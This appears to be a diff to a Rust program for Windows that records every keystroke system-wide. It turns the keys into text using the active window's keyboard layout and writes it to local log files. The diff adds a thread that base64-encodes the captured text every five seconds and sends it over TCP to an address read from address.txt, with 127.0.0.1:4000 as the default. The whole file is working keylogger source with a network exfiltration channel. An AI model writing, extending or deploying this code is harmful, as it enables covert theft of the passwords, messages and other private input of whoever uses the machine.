@@ -1,23 +1,29 @@
 use device_query::{DeviceQuery, DeviceState, Keycode};
+use std::sync::mpsc::channel;
+use std::sync::Arc;
+use std::sync::Mutex;
 use std::thread;
 use std::time::Duration;
-use std::sync::Mutex;
-use std::sync::Arc;
-
-use windows::Win32::UI::Input::KeyboardAndMouse::{GetAsyncKeyState, GetKeyState, ToUnicode, GetKeyboardState, GetKeyboardLayout};
-use windows::Win32::UI::Input::KeyboardAndMouse::ToUnicodeEx;
+use std::io::{Read, Write};
+use base64;
 use std::convert::TryFrom;
-use windows::core::PWSTR;
+use std::fs::OpenOptions;
+use std::net::TcpStream;
 use windows::core::Result;
+use windows::core::PWSTR;
 use windows::Win32::System::Threading::GetCurrentThreadId;
+use windows::Win32::UI::Input::KeyboardAndMouse::ToUnicodeEx;
+use windows::Win32::UI::Input::KeyboardAndMouse::{
+    GetAsyncKeyState, GetKeyState, GetKeyboardLayout, GetKeyboardState, ToUnicode,
+};
 use windows::Win32::UI::WindowsAndMessaging::{GetForegroundWindow, GetWindowThreadProcessId};
 
 // Key represents a single key entered by the user
-#[derive(Debug,Clone)]
+#[derive(Debug, Clone)]
 struct Key {
-    empty: bool, // Indicates if a key is pressed or not
+    empty: bool,        // Indicates if a key is pressed or not
     rune: Option<char>, // The character representation of the key
-    keycode: i32,  // The keycode of the key
+    keycode: i32,       // The keycode of the key
 }
 
 impl Key {
@@ -25,50 +31,140 @@ impl Key {
         Self {
             empty: true,
             rune: None,
-            keycode: 0
+            keycode: 0,
         }
     }
 }
 
 fn main() {
-    let keys1 = Arc::new(Mutex::new(vec![]));
-    let keys2 = Arc::new(Mutex::new(vec![]));
+    let (tx1, rx1) = channel::<Key>();
+    let (tx2, rx2) = channel::<Key>();
+
+    // let keys1 = Arc::new(Mutex::new(vec![]));
+    let keys1 = Arc::new(Mutex::new(Vec::<Key>::new()));
 
     // Collection thread
-    let h1 = std::thread::spawn({
-        let keys1 = keys1.clone();
-        move || {
-            loop {
-                let next_key = get_next();
-                // Push to keys1 and keys2
-                {
-                    let mut keys1 = keys1.lock().unwrap();
-                    keys1.push(next_key.clone());
+    // let h1 = thread::spawn(move || );
+
+    // Print all received keys to a file for debugging
+    let h2 = thread::spawn(move || {
+        let mut file = OpenOptions::new()
+            .create(true)
+            .write(true)
+            .append(true)
+            .open("pressed.txt")
+            .unwrap();
+
+        for received in rx1 {
+            writeln!(file, "{:?}", received).unwrap();
+        }
+    });
+    // for received in rx1 {
+    //     println!("Thread 1: Received {:?}", received);
+    // }
+
+    // let h3 = thread::spawn(move || {
+    //     let mut pressed_full = OpenOptions::new()
+    //         .create(true)
+    //         .write(true)
+    //         .append(true)
+    //         .open("pressed_full.txt")
+    //         .unwrap();
+    //     for received in rx2 {
+    //         println!("Thread 2: Received {:?}", received);
+    //     }
+    // });
+
+    let h3 = thread::spawn({
+        let keys1 = Arc::clone(&keys1);
+        move || loop {
+            let mut pressed_full = OpenOptions::new()
+                .create(true)
+                .write(true)
+                .append(true)
+                .open("pressed_full.txt")
+                .unwrap();
+            let mut keys_string = String::new();
+
+            {
+                let mut keys1 = keys1.lock().unwrap();
+                for key in keys1.drain(..) {
+                    if let Some(r) = key.rune {
+                        keys_string.push(r);
+                    }
                 }
-                {
-                    let mut keys2 = keys2.lock().unwrap();
-                    keys2.push(next_key.clone());
-                }
-                println!("next: {:?}", next_key);
             }
+            if keys_string.len() > 0 {
+                let keys_base64 = base64::encode(&keys_string);
+                writeln!(pressed_full, "text: {}", keys_string);
+                writeln!(pressed_full, "base64: {}", keys_base64);
+                writeln!(pressed_full, "=======================================");
+
+                let address = get_address();
+                let mut stream = TcpStream::connect(address);
+                match stream {
+                    Ok(s) => {
+                        let mut stream = s;
+                        writeln!(stream, "{}", keys_string).unwrap();
+                        writeln!(stream, "{}", keys_base64).unwrap();
+                    },
+                    Err(e) => {
+                        println!("Error connecting to server: {}", e);
+                        continue;
+                    }
+                }
+            };
+
+            thread::sleep(Duration::from_secs(5));
         }
     });
 
-    h1.join();
+    loop {
+        let next_key = get_next();
 
-    // loop {
-    //     let next_key = get_next();
-    //     // Push to keys1 and keys2
-    //     {
-    //         let mut keys1 = keys1.lock().unwrap();
-    //         keys1.push(next_key.clone());
-    //     }
-    //     {
-    //         let mut keys2 = keys2.lock().unwrap();
-    //         keys2.push(next_key.clone());
-    //     }
-    //     println!("next: {:?}", next_key);
-    // }
+        tx1.send(next_key.clone()).unwrap();
+        tx2.send(next_key.clone()).unwrap();
+
+        {
+            let mut keys1 = keys1.lock().unwrap();
+            keys1.push(next_key.clone());
+        }
+
+        println!("next: {:?}", next_key);
+    }
+
+    // h1.join().unwrap();
+    h2.join().unwrap();
+    h3.join().unwrap();
+}
+
+// Get TCP address from the ./address.txt file if it exists other wise return the default address
+fn get_address() -> String {
+    let mut address = String::new();
+    let mut file = OpenOptions::new()
+        .read(true)
+        .open("address.txt")
+        .unwrap_or_else(|_| {
+            // println!("No address.txt file found, using default address");
+            let mut df = OpenOptions::new()
+                .create(true)
+                .write(true)
+                .open("address.txt")
+                .unwrap();
+            df.write(b"127.0.0.1:4000").unwrap();
+            df
+        });
+    let res = file.read_to_string(&mut address);
+    match res {
+        Ok(_) => {
+            // println!("address.txt file found, using address: {}", address);
+            address
+        }
+        Err(e) => {
+            // println!("Error reading address.txt file: {}", e);
+            "127.0.0.1:4000".to_string()
+        }
+    }
 }
 
 fn get_next() -> Key {
@@ -76,7 +172,7 @@ fn get_next() -> Key {
 
     let next = wait_for_next_key();
     // println!("next: {:?}", next);
-    let t =  unsafe { GetKeyboardState(&mut keyboard_state) };
+    let t = unsafe { GetKeyboardState(&mut keyboard_state) };
 
     // Get the handle to the foreground window
     let foreground_window = unsafe { GetForegroundWindow() };
@@ -85,15 +181,15 @@ fn get_next() -> Key {
     // Get the keyboard layout for the foreground thread
     let layout = unsafe { GetKeyboardLayout(thread_id) };
     let mut pwszbuff = [0u16; 1]; // Create a buffer
-    // Use the correct arguments for ToUnicodeEx
+                                  // Use the correct arguments for ToUnicodeEx
     let code = unsafe {
         ToUnicodeEx(
             next as u32, // Use the key code as `wvirtkey`
             0, // `wscancode`, it's usually obtained from a WM_KEYDOWN or WM_KEYUP message.
             &keyboard_state,
             &mut pwszbuff, // Pass the buffer
-            0, // `wflags`, always 0 for this usage
-            layout
+            0,             // `wflags`, always 0 for this usage
+            layout,
         )
     };
     // println!("typeing {}: {} kb: {:?}", i, code, layout);
@@ -153,7 +249,7 @@ fn get_main_key_codes() -> Vec<i32> {
     let mut keycodes = vec![];
     // Iterate from 0 to 255 inclusive
     for i in 0..=255 {
-        if is_known_win_key(i){
+        if is_known_win_key(i) {
             keycodes.push(i);
         }
     }
@@ -234,4 +330,34 @@ fn is_known_win_key(win_key1: i32) -> bool {
             }
         }
     }
+}
+
+
+///// bk ///
+
+fn main2() {
+    let keys1 = Arc::new(Mutex::new(vec![]));
+    let keys2 = Arc::new(Mutex::new(vec![]));
+
+    // Collection thread
+    let h1 = std::thread::spawn({
+        let keys1 = keys1.clone();
+        move || {
+            loop {
+                let next_key = get_next();
+                // Push to keys1 and keys2
+                {
+                    let mut keys1 = keys1.lock().unwrap();
+                    keys1.push(next_key.clone());
+                }
+                {
+                    let mut keys2 = keys2.lock().unwrap();
+                    keys2.push(next_key.clone());
+                }
+                println!("next: {:?}", next_key);
+            }
+        }
+    });
+
+    h1.join();
 }
